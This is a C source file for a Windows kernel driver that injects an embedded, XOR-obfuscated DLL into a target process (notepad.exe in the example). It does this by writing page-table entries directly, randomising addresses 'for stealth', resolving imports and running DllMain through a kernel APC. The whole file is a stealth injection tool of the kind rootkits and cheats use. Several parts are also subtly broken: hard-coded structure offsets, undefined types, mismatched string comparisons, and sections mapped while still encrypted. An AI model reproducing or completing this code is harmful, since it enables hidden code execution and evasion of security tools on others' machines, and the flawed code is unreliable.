#include <ntddk.h>
#include <windef.h>

#define PAGE_SIZE 0x1000

// -------------------------
// Embedded DLL placeholder
// -------------------------
unsigned char g_EmbeddedDll[] = {
    0x4D, 0x5A, 0x90, 0x00, // MZ header
    // ... rest of DLL bytes
};
#define EMBEDDED_DLL_SIZE sizeof(g_EmbeddedDll)

void XorEncrypt(PUCHAR Buffer, SIZE_T Size, UCHAR Key)
{
    for (SIZE_T i = 0; i < Size; i++)
        Buffer[i] ^= Key;
}

PHYSICAL_ADDRESS AllocateRandomContiguousPage()
{
    // Random PFN allocation for stealth
    PVOID Mem = MmAllocateContiguousMemorySpecifyCache(PAGE_SIZE, 0, 0xFFFFFFFFFFFFFFFFULL, 0, MmNonCached);
    if (!Mem) return (PHYSICAL_ADDRESS){0};
    return MmGetPhysicalAddress(Mem);
}

ULONG64 GenerateRandomTargetVA()
{
    LARGE_INTEGER Seed;
    KeQuerySystemTimePrecise(&Seed);
    ULONG64 Base = 0x7FF600000000ULL;
    ULONG64 Offset = (Seed.QuadPart % 0x100000ULL) & ~0xFFFULL;
    return Base + Offset;
}

// -------------------------
// Kernel version-aware CR3 offset
// -------------------------
ULONG64 GetProcessCr3(PEPROCESS Process)
{
#if NTDDI_VERSION >= NTDDI_WIN10
    // Windows 10+ typical offset (adjust with symbols for exact build)
    ULONG64* DirBasePtr = (ULONG64*)((PUCHAR)Process + 0x188);
#else
    ULONG64* DirBasePtr = (ULONG64*)((PUCHAR)Process + 0x0288);
#endif
    return *DirBasePtr;
}

// -------------------------
// Low-level PTE mapping with permissions
// -------------------------
NTSTATUS MapPageToProcess(PEPROCESS Process, PVOID Va, PHYSICAL_ADDRESS Phys, ULONG Protection)
{
    ULONG64 Cr3 = GetProcessCr3(Process); 
    if (!Cr3) return STATUS_UNSUCCESSFUL;

    ULONG64 Indexes[4] = {
        ((ULONG64)Va >> 39) & 0x1FF,
        ((ULONG64)Va >> 30) & 0x1FF,
        ((ULONG64)Va >> 21) & 0x1FF,
        ((ULONG64)Va >> 12) & 0x1FF
    };

    ULONG64 PhysAddrVal = Cr3;

    for (int i = 0; i < 4; i++)
    {
        PHYSICAL_ADDRESS DirPhys = { .QuadPart = PhysAddrVal };
        PVOID MapDir = MmMapIoSpace(DirPhys, PAGE_SIZE, MmNonCached);
        if (!MapDir) return STATUS_INSUFFICIENT_RESOURCES;

        ULONG64* Entry = (ULONG64*)((PUCHAR)MapDir + Indexes[i]*8);

        if (i < 3)
        {
            if (!(*Entry & 1))
            {
                PHYSICAL_ADDRESS NewPage = AllocateRandomContiguousPage();
                PVOID TempMap = MmMapIoSpace(NewPage, PAGE_SIZE, MmNonCached);
                RtlZeroMemory(TempMap, PAGE_SIZE);
                MmUnmapIoSpace(TempMap, PAGE_SIZE);
                *Entry = NewPage.QuadPart | 3;
            }
            PhysAddrVal = *Entry & 0xFFFFFFFFFF000ULL;
        }
        else
        {
            *Entry = Phys.QuadPart | 3 | Protection;
        }
        MmUnmapIoSpace(MapDir, PAGE_SIZE);
    }

    __invlpg(Va);
    return STATUS_SUCCESS;
}

PEPROCESS GetProcessByName(PCWSTR Name)
{
    for (PEPROCESS p = PsGetNextProcess(NULL); p != NULL; p = PsGetNextProcess(p))
    {
        if (_wcsicmp(PsGetProcessImageFileName(p), Name) == 0)
        {
            ObReferenceObject(p);
            return p;
        }
    }
    return NULL;
}

NTSTATUS ApplyBaseRelocations(PVOID DllBase, ULONG64 TargetBase)
{
    PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)DllBase;
    PIMAGE_NT_HEADERS Nt = (PIMAGE_NT_HEADERS)((PUCHAR)DllBase + Dos->e_lfanew);
    ULONG64 Delta = TargetBase - Nt->OptionalHeader.ImageBase;

    if (!Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) return STATUS_SUCCESS;

    PIMAGE_BASE_RELOCATION Reloc = (PIMAGE_BASE_RELOCATION)((PUCHAR)DllBase +
        Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    while (Reloc->VirtualAddress)
    {
        ULONG Count = (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        USHORT* List = (USHORT*)(Reloc + 1);

        for (ULONG i = 0; i < Count; i++)
        {
            if ((List[i] >> 12) == IMAGE_REL_BASED_DIR64)
            {
                ULONG64* Ptr = (ULONG64*)((PUCHAR)DllBase + Reloc->VirtualAddress + (List[i] & 0xFFF));
                *Ptr += Delta;
            }
        }
        Reloc = (PIMAGE_BASE_RELOCATION)((PUCHAR)Reloc + Reloc->SizeOfBlock);
    }
    return STATUS_SUCCESS;
}

NTSTATUS ResolveImports(PVOID DllBase)
{
    PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)DllBase;
    PIMAGE_NT_HEADERS Nt = (PIMAGE_NT_HEADERS)((PUCHAR)DllBase + Dos->e_lfanew);

    if (!Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
        return STATUS_SUCCESS;

    PIMAGE_IMPORT_DESCRIPTOR ImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PUCHAR)DllBase +
        Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    for (; ImportDesc->Name; ImportDesc++)
    {
        PCHAR ModName = (PCHAR)((PUCHAR)DllBase + ImportDesc->Name);
        PLDR_DATA_TABLE_ENTRY ModuleEntry = NULL;
        for (PLIST_ENTRY p = PsLoadedModuleList.Flink; p != &PsLoadedModuleList; p = p->Flink)
        {
            ModuleEntry = CONTAINING_RECORD(p, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
            if (_stricmp((PCHAR)ModuleEntry->BaseDllName.Buffer, ModName) == 0)
                break;
            ModuleEntry = NULL;
        }
        if (!ModuleEntry) continue;
        PIMAGE_THUNK_DATA OrigThunk = (PIMAGE_THUNK_DATA)((PUCHAR)DllBase + ImportDesc->OriginalFirstThunk);
        PIMAGE_THUNK_DATA FirstThunk = (PIMAGE_THUNK_DATA)((PUCHAR)DllBase + ImportDesc->FirstThunk);
        while (OrigThunk->u1.AddressOfData)
        {
            PIMAGE_IMPORT_BY_NAME Import = (PIMAGE_IMPORT_BY_NAME)((PUCHAR)DllBase + OrigThunk->u1.AddressOfData);
            PVOID FuncAddr = NULL;
            PIMAGE_DOS_HEADER ModDos = (PIMAGE_DOS_HEADER)ModuleEntry->DllBase;
            PIMAGE_NT_HEADERS ModNt = (PIMAGE_NT_HEADERS)((PUCHAR)ModuleEntry->DllBase + ModDos->e_lfanew);
            PIMAGE_EXPORT_DIRECTORY Export = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)ModuleEntry->DllBase +
                ModNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            for (ULONG i = 0; i < Export->NumberOfNames; i++)
            {
                PCHAR Name = (PCHAR)((PUCHAR)ModuleEntry->DllBase + ((ULONG*)(((PUCHAR)ModuleEntry->DllBase + Export->AddressOfNames)))[i]);
                if (_stricmp(Name, (PCHAR)Import->Name) == 0)
                {
                    ULONG Ordinal = ((USHORT*)(((PUCHAR)ModuleEntry->DllBase + Export->AddressOfNameOrdinals)))[i];
                    FuncAddr = (PVOID)((PUCHAR)ModuleEntry->DllBase + ((ULONG*)(((PUCHAR)ModuleEntry->DllBase + Export->AddressOfFunctions)))[Ordinal]);
                    break;
                }
            }

            if (!FuncAddr && Import->Hint) 
            {
                FuncAddr = (PVOID)((PUCHAR)ModuleEntry->DllBase +
                    ((ULONG*)(((PUCHAR)ModuleEntry->DllBase + Export->AddressOfFunctions)))[Import->Hint]);
            }

            if (FuncAddr) FirstThunk->u1.Function = (ULONG64)FuncAddr;

            OrigThunk++; FirstThunk++;
        }
    }
    return STATUS_SUCCESS;
}

// -------------------------
// DllMain trampoline size calculation
// -------------------------
SIZE_T GetDllMainSize(PVOID DllBase)
{
    PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)DllBase;
    PIMAGE_NT_HEADERS Nt = (PIMAGE_NT_HEADERS)((PUCHAR)DllBase + Dos->e_lfanew);
    PIMAGE_SECTION_HEADER Sec = IMAGE_FIRST_SECTION(Nt);
    for (UINT i = 0; i < Nt->FileHeader.NumberOfSections; i++, Sec++)
    {
        if (strcmp((CHAR*)Sec->Name, ".text") == 0)
            return Sec->SizeOfRawData;
    }
    return 0x100; // fallback
}

// -------------------------
// DllMain APC routine
// -------------------------
VOID DllMainApcRoutine(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SysArg1, PVOID* SysArg2)
{
    UNREFERENCED_PARAMETER(Apc);
    UNREFERENCED_PARAMETER(NormalRoutine);
    UNREFERENCED_PARAMETER(NormalContext);

    PFUNC_DESC Desc = (PFUNC_DESC)*SysArg1;
    PVOID DllBase = *SysArg2;

    PUCHAR Tmp = (PUCHAR)ExAllocatePoolWithTag(NonPagedPool, Desc->Size, 'trmp');
    if (!Tmp) return;

    RtlCopyMemory(Tmp, Desc->EncryptedAddr, Desc->Size);
    XorEncrypt(Tmp, Desc->Size, 0xAA);

    typedef BOOL(WINAPI *DllMainType)(PVOID, DWORD, PVOID);
    DllMainType DllMainFunc = (DllMainType)Tmp;
    DllMainFunc(DllBase, DLL_PROCESS_ATTACH, NULL);

    RtlZeroMemory(Tmp, Desc->Size);
    ExFreePoolWithTag(Tmp, 'trmp');
}

NTSTATUS ManualMapDllUltraStealthMulti(PCWSTR TargetProcessName)
{
    for (;;)
    {
        PEPROCESS Proc = GetProcessByName(TargetProcessName);
        if (!Proc) break;

        ULONG64 TargetBase = GenerateRandomTargetVA();

        // Map sections individually with W^X enforcement
        PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)g_EmbeddedDll;
        PIMAGE_NT_HEADERS Nt = (PIMAGE_NT_HEADERS)((PUCHAR)g_EmbeddedDll + Dos->e_lfanew);
        PIMAGE_SECTION_HEADER Sec = IMAGE_FIRST_SECTION(Nt);

        for (UINT i = 0; i < Nt->FileHeader.NumberOfSections; i++, Sec++)
        {
            ULONG Prot = 0;
            if (Sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) Prot |= 0; // RX
            if (Sec->Characteristics & IMAGE_SCN_MEM_WRITE) Prot |= 2;   // RW

            SIZE_T Size = Sec->SizeOfRawData;
            PUCHAR SecData = (PUCHAR)g_EmbeddedDll + Sec->PointerToRawData;

            for (SIZE_T offset = 0; offset < Size; offset += PAGE_SIZE)
            {
                PHYSICAL_ADDRESS Phys = AllocateRandomContiguousPage();
                PUCHAR KBuf = MmMapIoSpace(Phys, PAGE_SIZE, MmNonCached);

                RtlCopyMemory(KBuf, SecData + offset, min(PAGE_SIZE, Size - offset));
                XorEncrypt(KBuf, PAGE_SIZE, 0xAA);

                MapPageToProcess(Proc, (PUCHAR)TargetBase + Sec->VirtualAddress + offset, Phys, Prot);
                MmUnmapIoSpace(KBuf, PAGE_SIZE);
            }
        }

        ApplyBaseRelocations((PVOID)TargetBase, TargetBase);
        ResolveImports((PVOID)TargetBase);

        FUNC_DESC Desc;
        Desc.EncryptedAddr = (PUCHAR)TargetBase + Nt->OptionalHeader.AddressOfEntryPoint;
        Desc.Size = GetDllMainSize((PVOID)TargetBase);

        PETHREAD Thread = PsGetNextProcessThread(Proc, NULL);
        if (!Thread) { ObDereferenceObject(Proc); break; }
        ObReferenceObject(Thread);

        PKAPC Apc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), 'apcL');
        KeInitializeApc(Apc, Thread, OriginalApcEnvironment, DllMainApcRoutine, NULL, NULL, KernelMode, NULL);
        KeInsertQueueApc(Apc, &Desc, (PVOID)TargetBase, 0);

        ObDereferenceObject(Thread);
        ObDereferenceObject(Proc);

        break; 
    }

    return STATUS_SUCCESS;
}

VOID DriverEntryExample()
{
    ManualMapDllUltraStealthMulti(L"notepad.exe");
}

